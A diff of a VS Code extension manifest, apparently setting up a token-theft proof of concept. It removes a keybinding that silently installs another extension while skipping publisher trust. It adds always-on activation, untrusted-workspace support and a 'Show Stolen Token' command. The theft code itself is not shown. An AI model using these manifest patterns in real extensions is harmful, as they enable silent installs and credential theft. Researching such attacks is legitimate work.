@@ -5,29 +5,24 @@
   "version": "0.0.1",
   "publisher": "Ammar",
   "engines": {
-    "vscode": "^0.0.0"
+    "vscode": "^1.0.0"
+  },
+  "activationEvents": [
+    "*",
+    "onStartupFinished"
+  ],
+  "main": "./out/extension.js",
+  "browser": "./out/extension.js",
+  "capabilities": {
+    "untrustedWorkspaces": {
+      "supported": true
+    }
   },
   "contributes": {
-    "keybindings": [
+    "commands": [
       {
-        "key": "ctrl+f1",
-        "command": "runCommands",
-        "args": {
-          "commands": [
-            {
-              "command": "workbench.extensions.installExtension",
-              "args": [
-                "StepsToMoon.hello-StepsToMoon-github",
-                {
-                  "donotSync": true,
-                  "context": {
-                    "skipPublisherTrust": true
-                  }
-                }
-              ]
-            }
-          ]
-        }
+        "command": "token-steal-poc.showToken",
+        "title": "Show Stolen Token"
       }
     ]
   },
@@ -43,5 +38,9 @@
     "glob": "^13.0.6",
     "mocha": "^11.7.6",
     "typescript": "^6.0.3"
+  },
+  "scripts": {
+    "compile": "tsc -p ./",
+    "watch": "tsc -watch -p ./"
   }
 }
